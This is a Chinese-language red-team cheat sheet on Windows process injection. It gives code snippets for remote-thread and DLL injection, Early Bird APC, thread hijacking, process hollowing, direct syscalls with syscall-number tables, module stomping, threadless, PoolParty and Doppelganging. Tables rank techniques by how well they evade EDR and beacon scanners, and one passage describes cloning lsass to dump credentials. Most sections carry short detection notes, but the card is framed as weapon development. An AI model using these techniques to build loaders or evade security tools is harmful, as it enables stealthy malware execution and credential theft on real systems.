# 进程注入技术速查

> 红队武器知识卡 — Windows进程注入，覆盖6类主流手法 + 高级对抗
> 来源：红队武器开发系列 8

## §1 经典注入

### CreateRemoteThread（最基础，EDR重点监控）
```
hProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
addr  = VirtualAllocEx(hProc, NULL, len, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(hProc, addr, shellcode, len, NULL);
CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)addr, NULL, 0, NULL);
```
检测：ETW CreateRemoteThread事件 + 跨进程VirtualAllocEx(RWX)

### DLL注入
```
addr = VirtualAllocEx(hProc, NULL, len_of_path, MEM_COMMIT|MEM_RESERVE, PAGE_READWRITE);
WriteProcessMemory(hProc, addr, "C:\\evil.dll", len_of_path, NULL);
CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32"), "LoadLibraryA"), addr, 0, NULL);
```
检测：异常DLL加载路径 + CreateRemoteThread指向LoadLibrary

### 反射DLL注入（不落盘）
```
// DLL自带ReflectiveLoader导出函数
// 注入端：WriteProcessMemory写整个DLL到远程内存
// CreateRemoteThread指向ReflectiveLoader偏移
// ReflectiveLoader在内存中手动完成PE映射（解析导入表/重定位）
```
检测：无对应文件的模块内存区段 + 手动映射特征（无PEB LDR记录）

## §2 APC注入

### QueueUserAPC
```
// 遍历目标进程线程，找Alertable状态的线程
hThread = OpenThread(THREAD_SET_CONTEXT, tid);
QueueUserAPC((PAPCFUNC)addr, hThread, NULL);
// 目标线程执行SleepEx/WaitForSingleObjectEx/MsgWaitFor时触发
```
检测：跨进程QueueUserAPC + 目标线程非预期APC执行

### Early Bird注入（高成功率）
```
STARTUPINFO si; PROCESS_INFORMATION pi;
CreateProcessA("svchost.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
addr = VirtualAllocEx(pi.hProcess, NULL, len, MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE);
WriteProcessMemory(pi.hProcess, addr, shellcode, len, NULL);
QueueUserAPC((PAPCFUNC)addr, pi.hThread, NULL);
ResumeThread(pi.hThread);  // 主线程恢复时立即执行APC
```
检测：CREATE_SUSPENDED + 立即QueueUserAPC + ResumeThread序列

## §3 线程劫持

```
hThread = OpenThread(THREAD_ALL_ACCESS, tid);
SuspendThread(hThread);
GetThreadContext(hThread, &ctx);
ctx.Rip = (DWORD64)shellcode_addr;  // x86用ctx.Eip
SetThreadContext(hThread, &ctx);
ResumeThread(hThread);
```
检测：SuspendThread + SetThreadContext修改RIP/EIP + 非预期代码段地址

## §4 Callback注入（无CreateRemoteThread）

### 回调函数滥用
```
// 先VirtualAllocEx+WriteProcessMemory写入shellcode，然后：
EnumFontsW(GetDC(0), NULL, (FONTENUMPROC)addr, 0);
// 或
EnumWindows((WNDENUMPROC)addr, 0);
// 或
CreateTimerQueueTimer(&hTimer, NULL, (WAITORTIMERCALLBACK)addr, NULL, 0, 0, WT_EXECUTEINTIMERTHREAD);
```
检测：回调函数指针指向非模块内存

### Section映射（跨进程，无WriteProcessMemory）
```
NtCreateSection(&hSection, PAGE_EXECUTE_READWRITE);
NtMapViewOfSection(hSection, GetCurrentProcess(), &local);   // 本地映射
memcpy(local, shellcode, len);                                 // 本地写入
NtMapViewOfSection(hSection, hRemoteProc, &remote);           // 远程映射
// 远程进程已有shellcode，通过APC/线程劫持/callback触发
```
检测：跨进程NtMapViewOfSection + 共享section的RX权限

## §5 Process Hollowing（进程镂空）

```
CreateProcessA("svchost.exe", CREATE_SUSPENDED, &pi);
NtUnmapViewOfSection(pi.hProcess, pbi.PebBaseAddress->ImageBaseAddress);
VirtualAllocEx(pi.hProcess, imageBase, sizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
// 写入PE头+各节区
WriteProcessMemory(pi.hProcess, imageBase, malicious_pe, headers_size);
for each section: WriteProcessMemory(pi.hProcess, imageBase+section.VA, section_data);
// 修改PEB中ImageBaseAddress + 入口点
SetThreadContext(pi.hThread, &ctx);  // ctx.Rcx = new_entrypoint
ResumeThread(pi.hThread);
```
检测：NtUnmapViewOfSection主模块 + 重新分配RWX + 内存PE与磁盘PE不匹配

## §6 Syscall直调（绕用户态hook）

### 实现方式
```
// 方式1：读ntdll磁盘副本提取syscall号
// 方式2：运行时从ntdll导出表解析SSN（System Service Number）
// 方式3：Hell's Gate — 在内存中扫描ntdll找未被hook的syscall stub模式
mov r10, rcx
mov eax, SSN    // 如NtAllocateVirtualMemory=0x18
syscall
ret
```

### 常用syscall替代
| 常规API | Syscall | SSN(Win10 21H2) |
|---------|---------|-----------------|
| VirtualAllocEx | NtAllocateVirtualMemory | 0x18 |
| WriteProcessMemory | NtWriteVirtualMemory | 0x3A |
| CreateRemoteThread | NtCreateThreadEx | 0xC1 |
| VirtualProtectEx | NtProtectVirtualMemory | 0x50 |

检测：内核态ETW（syscall本身不可绕）、调用栈回溯无ntdll帧、unbacked memory执行

## 选型速查

| 场景 | 推荐 | 理由 |
|------|------|------|
| 快速验证 | CreateRemoteThread | 最简单，PoC首选 |
| 避免CRT监控 | Callback/Section映射 | 不触发CreateRemoteThread事件 |
| 白进程伪装 | Process Hollowing/Early Bird | 进程名合法 |
| 绕用户态EDR | Syscall直调 | 跳过ntdll hook |
| 无WriteProcessMemory | Section映射 | 共享内存写入 |
| 绕内存扫描 | Module Stomping | 代码驻留在合法模块内存 |
| 无远程线程 | Threadless注入 | 劫持已有函数指针 |

## §7 Module Stomping / 模块踩踏（来源：红队武器开发-8）

Cobalt Strike 3.11+内置。核心：将shellcode写入已加载DLL的.text段，代码地址属于合法模块→绕内存扫描。
```c
// 加载一个牺牲DLL（不解析依赖）
HMODULE hMod = LoadLibraryExA("amsi.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((PBYTE)dos + dos->e_lfanew);
PIMAGE_SECTION_HEADER txt = IMAGE_FIRST_SECTION(nt);
PVOID pTxt = (PBYTE)dos + txt->VirtualAddress;
DWORD szTxt = txt->Misc.VirtualSize;
// 覆写.text段
VirtualProtect(pTxt, szTxt, PAGE_EXECUTE_READWRITE, &old);
memcpy(pTxt, shellcode, sizeof(shellcode));
VirtualProtect(pTxt, szTxt, PAGE_EXECUTE_READ, &old);
((void(*)())pTxt)();  // 执行
```
检测：DLL .text段哈希与磁盘不匹配（pe-sieve检测）。对抗：选不常被扫描的DLL。

## §8 远程模块踩踏 / 跨进程（来源：红队武器开发-8）

```c
// 1. 在远程进程中找已加载的目标DLL
// 先在本进程加载同一DLL获取.text段偏移
HMODULE hLocal = LoadLibraryExA("target.dll", NULL, DONT_RESOLVE_DLL_REFERENCES);
// 解析PE头获取.text RVA和大小
// 2. 在远程进程中获取该DLL基址
EnumProcessModules(hRemote, ...) → GetModuleFileNameExA匹配
// 3. 计算远程.text地址 = 远程DLL基址 + .text RVA
// 4. VirtualProtectEx改RWX → WriteProcessMemory写shellcode → 改回RX
// 5. 通过CreateRemoteThread或APC触发执行
```

## §9 Threadless注入（来源：红队武器开发-8）

无需CreateRemoteThread/APC，劫持目标进程中已有的函数调用。
```c
// 核心思路：修改目标进程中某个函数指针/导入表条目
// 当目标进程正常调用该函数时 → 跳转到shellcode
// 1. 找目标进程中频繁调用的函数（如Sleep的IAT条目）
// 2. 用Section映射写入shellcode（跳板+payload）
// 3. 修改IAT条目指向跳板
// 4. 跳板：执行shellcode → 恢复原始IAT → 跳回原函数（一次性触发）
```
工具：`ThreadlessInject`（GitHub）
优势：无远程线程创建事件，无APC排队，无SetThreadContext调用。
检测：IAT/EAT完整性校验、内存页权限异常。

## §10 Beacon扫描对抗（来源：红队武器开发-8）

扫描工具：`BeaconEye`（内存特征匹配）、`pe-sieve`（PE映像对比）、`Hunt-Sleeping-Beacons`（睡眠信标检测）

| 对抗手段 | 绕过目标 | 原理 |
|----------|---------|------|
| Sleep加密（Ekko/Zilean） | Hunt-Sleeping-Beacons | 睡眠时beacon内存加密 |
| Module Stomping | pe-sieve | 代码驻留合法模块 |
| 堆栈欺骗 | ETW栈回溯 | 伪造合法调用链 |
| 堆分配 | VirtualAlloc扫描 | 用HeapAlloc替代 |
| 间接Syscall | ntdll hook | 绕用户态监控 |

组合拳：`间接Syscall + Module Stomping + Sleep加密 + 堆栈欺骗` = 当前主流高级Loader方案

## §11 Process Doppelganging / TxF事务注入（来源：老鑫安全四期-二进制day2）

利用NTFS事务（TxF）的回滚特性：在事务内用恶意PE覆盖白文件→创建Section→回滚事务（磁盘恢复原样）→用该Section创建进程。磁盘上无痕迹。

```
NtCreateTransaction(&hTx, ...);
hFile = CreateFileTransactedA("svchost.exe", ..., hTx, ...);
WriteFile(hFile, malicious_pe, ...);
NtCreateSection(&hSection, ..., hFile, ..., SEC_IMAGE);
NtRollbackTransaction(hTx, TRUE);  // 磁盘恢复原样
NtCreateProcessEx(&hProc, ..., hSection, ...);
// 设置PEB参数 + NtCreateThreadEx启动
```

弱点：最终仍依赖`NtCreateThreadEx`。Win10+部分TxF功能被弃用。
工具：hasherezade/process_doppelganging、transacted_hollowing（混合变体）

## §12 Thread Pool注入 / PoolParty（来源：老鑫安全四期-免杀day12）

不创建远程线程，劫持目标进程的默认线程池执行shellcode。三类攻击向量：
- **Worker Factory攻击**：通过`DuplicateHandle`获取TpWorkerFactory句柄，修改工作回调指向shellcode
- **I/O Completion Port攻击**：关联攻击者控制的I/O对象到远程线程池完成端口，触发回调
- **Timer攻击**：将shellcode关联的计时器排入目标进程的计时器队列

关键步骤：
1. `NtQueryInformationProcess` 查询目标进程句柄表
2. `DuplicateHandle` 复制对应类型句柄
3. 远程进程分配内存写入shellcode
4. 修改线程池内部结构（TP_WORK/TP_IO/TP_TIMER）中的回调指针

优势：无CreateRemoteThread/APC/SetThreadContext，绕过主流EDR行为检测。
工具：PoolPartyBof

## §13 TLS回调注入（来源：老鑫安全四期-免杀day12）

利用PE的TLS（Thread Local Storage）目录中的回调函数数组。TLS回调在进程主入口点执行前被调用。

- TLS回调存储在PE的TLS Directory → `AddressOfCallBacks`指针数组
- 新线程创建时自动触发TLS回调，早于DllMain和main
- 远程注入：修改目标进程PE的TLS目录回调指针指向shellcode

检测：TLS目录回调指向非模块内存、PE完整性校验。

## §14 进程克隆 / Process Forking（来源：老鑫安全四期-二进制day8）

通过`NtCreateUserProcess`配合`PROCESS_CREATE_FLAGS_INHERIT_HANDLES`创建当前进程的完整克隆（内存布局、句柄表一并复制）。

```c
PS_CREATE_INFO createInfo = { .Size = sizeof(createInfo) };
NtCreateUserProcess(&hProc, &hThread,
    PROCESS_ALL_ACCESS, THREAD_ALL_ACCESS,
    NULL, NULL,
    PROCESS_CREATE_FLAGS_INHERIT_HANDLES, 0,
    NULL, &createInfo, NULL);
if (status == STATUS_PROCESS_CLONED) {
    // 子进程上下文：内存已复制，可执行payload
}
```

武器化用途：
- 凭证转储：克隆lsass.exe内存→在克隆进程中读取（不直接操作lsass）
- 内存隐蔽操作：在克隆中执行敏感操作后销毁
- 绕过PPL保护：某些场景下克隆进程不继承保护级别
